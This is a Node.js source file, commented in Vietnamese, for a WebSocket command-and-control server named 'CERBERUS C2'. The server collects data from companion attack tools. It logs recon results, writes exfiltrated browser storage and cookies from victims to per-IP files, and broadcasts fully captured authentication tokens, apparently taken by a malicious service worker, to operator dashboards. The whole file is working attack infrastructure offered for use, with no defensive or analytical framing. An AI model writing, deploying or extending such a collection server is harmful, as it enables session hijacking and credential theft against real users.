const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

// Cấu hình cổng và đường dẫn log
const PORT = 8080;
const LOG_DIR = path.join(__dirname, 'logs');

// Tạo thư mục logs nếu chưa tồn tại
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Khởi tạo WebSocket Server
const wss = new WebSocket.Server({ port: PORT });

console.log(`
  [!] CERBERUS C2 CENTRAL BRAIN - ONLINE
  [!] Listening on port: ${PORT}
  [!] Logging directory: ${LOG_DIR}
  ----------------------------------------
`);

wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    console.log(`[*] New connection established: ${clientIp}`);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            const timestamp = new Date().toISOString();

            // 1. XỬ LÝ DỮ LIỆU TRINH SÁT (Từ recon_scanner.py)
            if (data.type === 'NEW_DEVICE') {
                console.log(`[RECON] Device Found: ${data.ip} | Host: ${data.vendor}`);
                broadcastToDashboards(data);
            }

            // 2. XỬ LÝ DỮ LIỆU TRÍCH XUẤT (Từ vault_cracker.js)
            else if (data.type === 'VAULT_DUMP') {
                const logPath = path.join(LOG_DIR, `vault_${data.ip || 'target'}.json`);
                fs.appendFileSync(logPath, JSON.stringify({ time: timestamp, content: data.content }, null, 2) + "\n");
                console.log(`[!] VAULT DUMP: Data exfiltrated from ${data.ip || 'unknown'}`);
                
                // Gửi thông báo về Dashboard để hiển thị trạng thái
                broadcastToDashboards({
                    type: 'LOG',
                    level: 'success',
                    message: `Exfiltrated Storage/Cookies from ${data.ip}`
                });
            }

            // 3. XỬ LÝ THÔNG TIN XÁC THỰC (Từ ghost_sw.js)
            else if (data.type === 'AUTH_EXFIL') {
                console.log(`[CRITICAL] Auth Token Intercepted: ${data.data.substring(0, 20)}...`);
                broadcastToDashboards({
                    type: 'LOG',
                    level: 'critical',
                    message: `CAPTURED AUTH TOKEN: ${data.data}`
                });
            }

            // 4. CHUYỂN TIẾP LOG HỆ THỐNG
            else if (data.type === 'LOG') {
                broadcastToDashboards(data);
            }

        } catch (err) {
            // Xử lý các thông điệp không định dạng JSON (có thể là stream thô)
            console.log(`[RAW DATA] Received non-JSON packet from ${clientIp}`);
        }
    });

    ws.on('close', () => {
        console.log(`[x] Connection closed: ${clientIp}`);
    });
});

/**
 * Gửi dữ liệu tới tất cả các Dashboard đang mở
 */
function broadcastToDashboards(payload) {
    const message = JSON.stringify(payload);
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
}

// Xử lý lỗi server
wss.on('error', (error) => {
    console.error(`[SERVER ERROR] ${error.message}`);
});